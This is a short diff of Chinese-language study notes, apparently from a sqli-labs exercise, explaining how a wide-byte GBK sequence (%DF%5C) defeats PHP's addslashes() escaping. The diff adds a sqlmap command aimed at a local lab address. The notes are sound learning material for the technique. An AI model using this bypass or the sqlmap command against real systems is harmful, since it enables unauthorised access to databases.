@@ -17,3 +17,5 @@ addalashes()函数:返回在预定义字符之前添加反斜杠的字符串
 2.过滤\'中的\
 构造%DF%5C%5C%27，addslashes()会在两个%5C和%27之前都加上\即%5C，变为%DF %5c%5c %5c%5c %5c%27
 但宽字符集认为%DF%5c是一个字符即縗，则%DF%5c %5c%5c %5c%5c %27即 縗\\\\' ，四个\正好转义为两个\，即'未被转义
+
+sqlmap -u http://10.0.2.15/sqli/Less-33/?id=1%DF --search --level 3 --risk 1 --thread 10
